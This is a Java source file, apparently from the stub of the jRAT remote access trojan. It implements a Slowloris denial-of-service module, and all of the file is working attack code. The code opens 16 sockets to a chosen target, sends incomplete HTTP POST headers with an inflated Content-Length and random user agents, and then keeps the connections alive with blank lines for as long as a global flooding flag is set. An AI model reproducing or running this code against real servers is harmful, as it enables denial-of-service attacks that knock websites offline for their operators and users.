package su.jrat.stub.flood;

import java.io.PrintWriter;
import java.net.Socket;

import su.jrat.stub.Constants;

public class Slowloris implements Runnable {

	private String target;
	private int port;

	public Slowloris(String t, int p) {
		target = t;
		port = p;
	}

	public void run() {
		Socket[] sockets = new Socket[16];

		while (Constants.flooding) {
				for (int i = 0; i < sockets.length; i++) {
					try {
						if (sockets[i] != null && sockets[i].isConnected()) {
							PrintWriter pw = new PrintWriter(sockets[i].getOutputStream());
							pw.println();
							pw.flush();
						} else {
							sockets[i] = new Socket(target, port);	

							PrintWriter pw = new PrintWriter(sockets[i].getOutputStream());
							pw.println("POST / HTTP/1.1");
							pw.println("User-Agent: " + Useragents.getRandomUserAgent());
							pw.println("Connection: keep-alive");
							pw.println("Keep-Alive: 900");
							pw.println("Content-Length: 10000");
							pw.println("Content-Type: application/x-www-form-urlencoded");
							pw.println();
							pw.flush();

						}
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
			}

			for (Socket socket : sockets) {
				try {
					socket.close();
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		
	}

}
